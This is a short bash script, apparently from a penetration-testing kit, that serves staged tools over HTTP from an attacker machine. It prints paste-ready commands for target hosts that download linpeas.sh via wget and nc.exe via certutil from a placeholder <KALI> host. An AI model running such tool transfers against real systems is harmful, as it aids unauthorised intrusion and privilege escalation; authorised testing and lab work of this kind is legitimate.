#!/bin/bash
# --- self-locate kit root (survives moving the whole tree) ---
KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
# Serve the staged tool kit over HTTP. Usage: ./serve.sh [port]
# Prefers fuzzy-httpserver (typo-tolerant: serves the right file even if the
# target's wget path has a typo); falls back to python http.server.
cd $KIT/serve || exit 1
PORT="${1:-80}"
echo "[*] Serving $(pwd) on 0.0.0.0:$PORT"
echo "    Linux:    wget http://<KALI>:$PORT/linux/linpeas.sh -O /tmp/lp.sh"
echo "    Windows:  certutil -urlcache -f http://<KALI>:$PORT/windows/nc.exe nc.exe"
if command -v fuzzy-httpserver >/dev/null; then
  echo "    (fuzzy-httpserver: typo-tolerant matching enabled)"
  sudo "$(command -v fuzzy-httpserver)" -p "$PORT" -d .
else
  sudo python3 -m http.server "$PORT"
fi
